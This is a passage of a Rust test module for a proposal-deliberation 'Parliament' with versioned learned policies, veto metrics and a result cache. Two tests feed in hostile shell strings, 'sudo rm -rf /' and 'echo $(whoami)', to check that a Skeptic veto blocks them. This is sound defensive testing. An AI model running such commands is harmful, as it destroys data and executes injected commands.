        assert_eq!(s_votes, 3, "Simplified 应有 3 个 VoteCast 事件");
        assert_eq!(f_votes, 5, "Full 应有 5 个 VoteCast 事件");
    }

    /// 辅助函数:统计 VoteCast 事件数量
    ///
    /// WHY 使用 EventReceiver 而非 mpsc::Receiver:
    /// `bus.subscribe()` 返回 `EventReceiver`,其 `recv()` 返回
    /// `Result<NexusEvent, EventBusError>`(非 `Option<NexusEvent>`)。
    /// 此函数统一三策略测试中的 VoteCast 事件计数逻辑。
    async fn count_vote_cast_events(rx: &mut event_bus::EventReceiver, max_polls: usize) -> usize {
        let mut count = 0;
        for _ in 0..max_polls {
            if let Ok(Ok(NexusEvent::VoteCast { .. })) =
                tokio::time::timeout(Duration::from_millis(100), rx.recv()).await
            {
                count += 1;
            }
        }
        count
    }

    // ============================================================
    // Learned 策略测试(版本号 + 学习路径)
    // ============================================================

    #[tokio::test]
    async fn test_s5_learned_policy_carries_version() {
        // Learned 策略携带版本号,便于 A/B 测试与回滚
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);

        // 下发 Learned(v=42, FastPath)
        parliament
            .learner_holder()
            .update_policy(ParliamentPolicy::learned(42, ActivationStrategy::FastPath));
        assert_eq!(parliament.learner_holder().version(), Some(42));

        let consensus = parliament.deliberate(&quest, &proposal).await.unwrap();
        assert!(
            consensus.is_reached(),
            "Learned(FastPath) 应直接返回 Reached"
        );
    }

    #[tokio::test]
    async fn test_s5_learned_policy_versioned_for_ab_test() {
        // 不同版本的 Learned 策略可独立追踪
        let parliament = make_parliament();

        parliament
            .learner_holder()
            .update_policy(ParliamentPolicy::learned(1, ActivationStrategy::Simplified));
        let v1 = parliament.learner_holder().version();
        assert_eq!(v1, Some(1));

        parliament
            .learner_holder()
            .update_policy(ParliamentPolicy::learned(2, ActivationStrategy::Full));
        let v2 = parliament.learner_holder().version();
        assert_eq!(v2, Some(2));

        assert_ne!(v1, v2, "不同版本号应不同");
    }

    #[tokio::test]
    async fn test_s5_static_vs_learned_distinct_paths() {
        // Static 与 Learned 同策略应走相同路径,但 holder 状态不同
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);

        // Static(Full)
        let static_policy = ParliamentPolicy::static_policy(ActivationStrategy::Full);
        assert!(static_policy.is_static());

        // Learned(v=1, Full)
        let learned_policy = ParliamentPolicy::learned(1, ActivationStrategy::Full);
        assert!(learned_policy.is_learned());

        // 两者策略值相同,deliberate_with_policy 行为应一致
        let c1 = parliament
            .deliberate_with_policy(&quest, &proposal, &static_policy)
            .await
            .unwrap();
        let c2 = parliament
            .deliberate_with_policy(&quest, &proposal, &learned_policy)
            .await
            .unwrap();

        // 同策略(Full)→ 同结果(均 Reached)
        assert_eq!(c1.is_reached(), c2.is_reached());
    }

    // ============================================================
    // 端到端生命周期测试
    // ============================================================

    #[tokio::test]
    async fn test_s5_lifecycle_static_to_learned_to_fallback() {
        // 完整生命周期:Static → Learned(v1) → Learned(v2) → 熔断 → Static
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);

        // 1. 初始 Static(Full)
        assert!(!parliament.learner_holder().is_learned());
        let c1 = parliament.deliberate(&quest, &proposal).await.unwrap();
        assert!(c1.is_reached(), "Static(Full) 应达成共识");

        // 2. 下发 Learned(v1, Simplified)
        parliament
            .learner_holder()
            .update_policy(ParliamentPolicy::learned(1, ActivationStrategy::Simplified));
        assert!(parliament.learner_holder().is_learned());
        let c2 = parliament.deliberate(&quest, &proposal).await.unwrap();
        assert!(c2.is_reached(), "Learned(Simplified) 应达成共识");

        // 3. 下发 Learned(v2, FastPath)
        parliament
            .learner_holder()
            .update_policy(ParliamentPolicy::learned(2, ActivationStrategy::FastPath));
        let c3 = parliament.deliberate(&quest, &proposal).await.unwrap();
        assert!(c3.is_reached(), "Learned(FastPath) 应达成共识");

        // 4. 灰度指标不达标,触发熔断
        parliament.learner_holder().fallback_to_static();
        assert!(!parliament.learner_holder().is_learned());
        let c4 = parliament.deliberate(&quest, &proposal).await.unwrap();
        assert!(c4.is_reached(), "熔断后 Static(Full) 应达成共识");
    }

    // ============================================================
    // 协调度量接线闭环:DebateCompleted 埋点测试
    // ============================================================

    /// 从事件流中提取首个 DebateCompleted 事件(跳过其他事件)
    ///
    /// WHY 轮询提取:deliberate 会依次发布 DebateStarted/VoteCast/
    /// ConsensusReached/DebateCompleted 等多个事件,测试只关心最后的观测事件。
    async fn recv_debate_completed(rx: &mut event_bus::EventReceiver) -> NexusEvent {
        for _ in 0..30 {
            match tokio::time::timeout(Duration::from_millis(200), rx.recv()).await {
                Ok(Ok(event)) if event.type_name() == "DebateCompleted" => return event,
                Ok(_) => continue,
                Err(_) => break,
            }
        }
        panic!("未收到 DebateCompleted 事件");
    }

    #[tokio::test]
    async fn test_debate_completed_full_path_carries_latency_and_rates() {
        // Full 路径:事件应携带 latency>0、strategy="full"、投票率 Some
        let bus = EventBus::new();
        let mut rx = bus.subscribe();
        let parliament = Parliament::new(ParliamentConfig::default(), bus);
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);

        let consensus = parliament.deliberate(&quest, &proposal).await.unwrap();
        assert!(consensus.is_reached());

        match recv_debate_completed(&mut rx).await {
            NexusEvent::DebateCompleted {
                quest_id,
                debate_latency_ms,
                strategy,
                weighted_approval_rate,
                participation_rate,
                outcome,
                ..
            } => {
                assert_eq!(quest_id, "q-1");
                assert!(debate_latency_ms > 0.0, "审议延迟应 > 0");
                assert_eq!(strategy, "full");
                let approval = weighted_approval_rate.expect("Full 路径应有赞成率");
                assert!((0.0..=1.0).contains(&approval), "赞成率应在 [0,1]");
                let participation = participation_rate.expect("Full 路径应有参与率");
                assert!((participation - 1.0).abs() < 1e-6, "5/5 角色参与率应为 1.0");
                assert_eq!(outcome, "Reached");
            }
            other => panic!("Expected DebateCompleted, got {:?}", other.type_name()),
        }
    }

    #[tokio::test]
    async fn test_debate_completed_fastpath_has_no_vote_rates() {
        // FastPath 路径:无投票,事件的投票率字段应为 None
        let bus = EventBus::new();
        let mut rx = bus.subscribe();
        let parliament = Parliament::new(ParliamentConfig::default(), bus);
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);
        let policy = ParliamentPolicy::static_policy(ActivationStrategy::FastPath);

        let consensus = parliament
            .deliberate_with_policy(&quest, &proposal, &policy)
            .await
            .unwrap();
        assert!(consensus.is_reached());

        match recv_debate_completed(&mut rx).await {
            NexusEvent::DebateCompleted {
                strategy,
                weighted_approval_rate,
                participation_rate,
                outcome,
                debate_latency_ms,
                ..
            } => {
                assert_eq!(strategy, "fast-path");
                assert!(weighted_approval_rate.is_none(), "FastPath 无投票数据");
                assert!(participation_rate.is_none());
                assert_eq!(outcome, "Reached");
                assert!(debate_latency_ms >= 0.0);
            }
            other => panic!("Expected DebateCompleted, got {:?}", other.type_name()),
        }
    }

    #[tokio::test]
    async fn test_debate_completed_simplified_path_strategy_label() {
        // Simplified 路径:strategy 标签应为 "simplified",投票率 Some
        let bus = EventBus::new();
        let mut rx = bus.subscribe();
        let parliament = Parliament::new(ParliamentConfig::default(), bus);
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);
        let policy = ParliamentPolicy::static_policy(ActivationStrategy::Simplified);

        parliament
            .deliberate_with_policy(&quest, &proposal, &policy)
            .await
            .unwrap();

        match recv_debate_completed(&mut rx).await {
            NexusEvent::DebateCompleted {
                strategy,
                weighted_approval_rate,
                ..
            } => {
                assert_eq!(strategy, "simplified");
                assert!(
                    weighted_approval_rate.is_some(),
                    "Simplified 路径应携带赞成率"
                );
            }
            other => panic!("Expected DebateCompleted, got {:?}", other.type_name()),
        }
    }

    #[tokio::test]
    async fn test_debate_completed_veto_path_outcome_vetoed() {
        // Skeptic 前置否决短路路径:也应发布 DebateCompleted(outcome=Vetoed,无投票率)
        let bus = EventBus::new();
        let mut rx = bus.subscribe();
        let parliament = Parliament::new(ParliamentConfig::default(), bus);
        let quest = make_quest(2, ThinkingMode::Fast);
        // 恶意模式触发 Skeptic 前置否决(不进入辩论)
        let proposal = Proposal::new("p-veto-metric", "q-1", "sudo rm -rf /", 0.9);

        let consensus = parliament.deliberate(&quest, &proposal).await.unwrap();
        assert!(consensus.is_vetoed());

        match recv_debate_completed(&mut rx).await {
            NexusEvent::DebateCompleted {
                outcome,
                weighted_approval_rate,
                participation_rate,
                ..
            } => {
                assert_eq!(outcome, "Vetoed");
                assert!(weighted_approval_rate.is_none(), "否决短路无投票数据");
                assert!(participation_rate.is_none());
            }
            other => panic!("Expected DebateCompleted, got {:?}", other.type_name()),
        }
    }

    #[test]
    fn test_consensus_outcome_label_all_variants() {
        // 标签是事件契约的一部分,三变体全覆盖验证
        let reached = Consensus::Reached {
            decision_hash: "h".into(),
            dpo_pair_id: None,
        };
        let rejected = Consensus::Rejected { reason: "r".into() };
        let vetoed = Consensus::Vetoed {
            veto_reason: "v".into(),
            frozen_capabilities: vec![],
        };
        assert_eq!(consensus_outcome_label(&reached), "Reached");
        assert_eq!(consensus_outcome_label(&rejected), "Rejected");
        assert_eq!(consensus_outcome_label(&vetoed), "Vetoed");
    }

    // ============================================================
    // DeliberationCache 集成测试
    // ============================================================

    #[tokio::test]
    async fn test_cache_hit_returns_cached_result() {
        // 同一提案两次审议,第二次应命中缓存,结果相同
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = Proposal::new("p-cache-hit", "q-1", "测试缓存命中", 0.2);

        // 首次审议(写入缓存)
        let result1 = parliament.deliberate(&quest, &proposal).await.unwrap();
        // 验证缓存有 1 条
        assert_eq!(
            parliament.deliberation_cache.lock().unwrap().len(),
            1,
            "首次审议后缓存应有 1 条"
        );

        // 第二次审议(应命中缓存)
        let result2 = parliament.deliberate(&quest, &proposal).await.unwrap();

        // 两次结果应相同(缓存命中)
        assert_eq!(result1, result2, "缓存命中应返回相同结果");
        // 缓存条目数仍为 1(未新增)
        assert_eq!(
            parliament.deliberation_cache.lock().unwrap().len(),
            1,
            "缓存命中不应新增条目"
        );
    }

    #[tokio::test]
    async fn test_cache_miss_different_proposal() {
        // 不同提案应不命中缓存,缓存条目增加
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal1 = Proposal::new("p-miss-1", "q-1", "提案一", 0.2);
        let proposal2 = Proposal::new("p-miss-2", "q-1", "提案二", 0.3);

        // 首次审议
        let _ = parliament.deliberate(&quest, &proposal1).await.unwrap();
        assert_eq!(
            parliament.deliberation_cache.lock().unwrap().len(),
            1,
            "首次审议后缓存应有 1 条"
        );

        // 不同提案应不命中缓存
        let _ = parliament.deliberate(&quest, &proposal2).await.unwrap();
        // 缓存应新增一条
        assert_eq!(
            parliament.deliberation_cache.lock().unwrap().len(),
            2,
            "不同提案应新增缓存条目"
        );
    }

    #[tokio::test]
    async fn test_cache_eviction() {
        // 超过 10 条缓存后,最早条目被淘汰
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);

        // 插入 11 条不同提案(超过最大 10 条)
        for i in 0..11 {
            let proposal = Proposal::new(
                format!("p-evict-{i}"),
                "q-1",
                format!("缓存淘汰测试提案 {i}"),
                0.2,
            );
            let _ = parliament.deliberate(&quest, &proposal).await.unwrap();
        }

        // 缓存应不超过 10 条
        assert_eq!(
            parliament.deliberation_cache.lock().unwrap().len(),
            10,
            "缓存应不超过 10 条"
        );

        // 最早的条目(p-evict-0)应被淘汰,重新审议时缓存未命中
        let proposal0 = Proposal::new("p-evict-0", "q-1", "缓存淘汰测试提案 0", 0.2);
        let _ = parliament.deliberate(&quest, &proposal0).await.unwrap();
        // 重新审议被淘汰的条目,缓存应重新插入(仍为 10 条)
        assert_eq!(
            parliament.deliberation_cache.lock().unwrap().len(),
            10,
            "重新审议淘汰条目后缓存仍为 10 条(LRU 淘汰)"
        );
    }

    #[tokio::test]
    async fn test_cache_hit_different_strategy() {
        // 相同提案但不同策略,应不命中缓存(策略不同,键不同)
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = Proposal::new("p-strategy", "q-1", "策略测试提案", 0.2);

        // Full 策略审议
        let policy_full = ParliamentPolicy::static_policy(ActivationStrategy::Full);
        let result_full = parliament
            .deliberate_with_policy(&quest, &proposal, &policy_full)
            .await
            .unwrap();
        assert_eq!(
            parliament.deliberation_cache.lock().unwrap().len(),
            1,
            "Full 策略审议后缓存应有 1 条"
        );

        // Simplified 策略审议(不同策略,应不命中缓存)
        let policy_sim = ParliamentPolicy::static_policy(ActivationStrategy::Simplified);
        let _result_sim = parliament
            .deliberate_with_policy(&quest, &proposal, &policy_sim)
            .await
            .unwrap();
        // 不同策略,缓存应新增 1 条
        assert_eq!(
            parliament.deliberation_cache.lock().unwrap().len(),
            2,
            "不同策略应新增缓存条目"
        );

        // 再次 Full 策略审议(应命中缓存)
        let result_full2 = parliament
            .deliberate_with_policy(&quest, &proposal, &policy_full)
            .await
            .unwrap();
        assert_eq!(result_full, result_full2, "Full 策略缓存命中应返回相同结果");
        // 缓存条目数不变(命中不新增)
        assert_eq!(
            parliament.deliberation_cache.lock().unwrap().len(),
            2,
            "缓存命中不应新增条目"
        );
    }

    #[tokio::test]
    async fn test_cache_veto_result_cached() {
        // Skeptic 否决结果也应缓存,相同提案再次审议直接返回 Vetoed
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = Proposal::new("p-veto-cache", "q-1", "echo $(whoami)", 0.2);

        // 首次审议(Skeptic 否决)
        let result1 = parliament.deliberate(&quest, &proposal).await.unwrap();
        assert!(result1.is_vetoed(), "首次应被 Skeptic 否决");
        // 缓存应有 1 条
        assert_eq!(
            parliament.deliberation_cache.lock().unwrap().len(),
            1,
            "否决结果应写入缓存"
        );

        // 第二次审议(应命中缓存)
        let result2 = parliament.deliberate(&quest, &proposal).await.unwrap();
        assert!(result2.is_vetoed(), "第二次仍应为否决(缓存命中)");
        assert_eq!(result1, result2, "缓存命中应返回相同否决结果");
        assert_eq!(
            parliament.deliberation_cache.lock().unwrap().len(),
            1,
            "缓存命中不应新增条目"
        );
    }

    proptest::proptest! {
        /// 属性:自适应策略选择器在所有合法输入下不 panic
        #[test]
        fn prop_adaptive_strategy_never_panics(
            risk_level in 0.0f32..1.0,
            ratio in 0.0f64..10.0,
            system_load in 0.0f32..1.0,
            health_score in 0u8..=100,
        ) {
            use crate::adaptive_strategy::AdaptiveStrategySelector;
            let selector = AdaptiveStrategySelector::new(None);
            let strategy = selector.select(risk_level, ratio, system_load, health_score, ActivationStrategy::Full);
            // 策略必须是三选一
            proptest::prop_assert!(matches!(strategy, ActivationStrategy::FastPath | ActivationStrategy::Simplified | ActivationStrategy::Full));
        }
    }
}
